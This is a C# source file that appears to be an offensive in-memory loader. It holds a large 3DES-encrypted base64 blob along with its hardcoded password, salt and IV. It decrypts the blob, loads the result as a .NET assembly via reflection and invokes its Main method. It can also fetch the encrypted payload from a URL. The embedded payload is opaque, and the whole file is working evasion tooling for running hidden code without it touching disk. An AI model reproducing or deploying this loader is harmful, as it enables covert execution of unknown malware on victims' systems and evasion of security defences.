using System;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System.IO;
using _3DESv2;
using System.Collections.Generic;
using System.Net;

namespace _3DESv2
{
    class Program
    {
        static void Main(string[] args)
        {

            string Password = "oqphnbt0kuedizy4m3avx6r5lf21jc8s";
            string EncryptedBinaryFile = "";
string EncryptedB64String = "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";
            string Salt = "vh9b4tsxrl1560wg8nda2meuc7yjzop3";
            string InitialVector = "SBFTWSDXBYVOEMTD";
            string DecryptedBinaryFilePath = "";
            string DownloadEncryptedBinaryFile = "";
            byte[] scriptBytes = new byte[] { };


            if (EncryptedBinaryFile != "")
            {
                scriptBytes = System.IO.File.ReadAllBytes(EncryptedBinaryFile);
            }
            else if (EncryptedB64String != "")
            {
                scriptBytes = System.Convert.FromBase64String(EncryptedB64String);
            }
            else if (DownloadEncryptedBinaryFile != "")
            {
                WebClient client = new System.Net.WebClient();
                scriptBytes = client.DownloadData(DownloadEncryptedBinaryFile);
            }
            else 
            {
                Console.WriteLine("[-] Something went wrong!");
            }

            ASCIIEncoding encoding = new ASCIIEncoding();
            PasswordDeriveBytes derivedPass = new PasswordDeriveBytes(Password, encoding.GetBytes(Salt), "SHA1", 2);
            byte[] IV = encoding.GetBytes(InitialVector);
            byte[] Key = derivedPass.GetBytes(16);
            TripleDESCryptoServiceProvider TripleDESobject = new TripleDESCryptoServiceProvider();
            TripleDESobject.Mode = CipherMode.CBC;
            byte[] buffer = new byte[(scriptBytes.Length - 8)];
            ICryptoTransform TripleDESdecryptor = TripleDESobject.CreateDecryptor(Key, IV);
            MemoryStream EncryptedMemoryStream = new MemoryStream(scriptBytes);
            CryptoStream CryptoStreamDecrypt = new CryptoStream(EncryptedMemoryStream, TripleDESdecryptor, CryptoStreamMode.Read);
            int DecryptedData = CryptoStreamDecrypt.Read(buffer, 0, buffer.Length);
            //https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettypes?view=net-5.0
            Assembly assembly = Assembly.Load(buffer);
            Type type = assembly.GetTypes()[0];
            //MethodInfo method = assembly.EntryPoint;
            //object execute = method.Invoke(null, new Object[] { null });
            type.GetMethod("Main").Invoke(type, new Object[] { });
            CryptoStreamDecrypt.Close();
            TripleDESobject.Clear();
            //return 0;


        }
    }
}
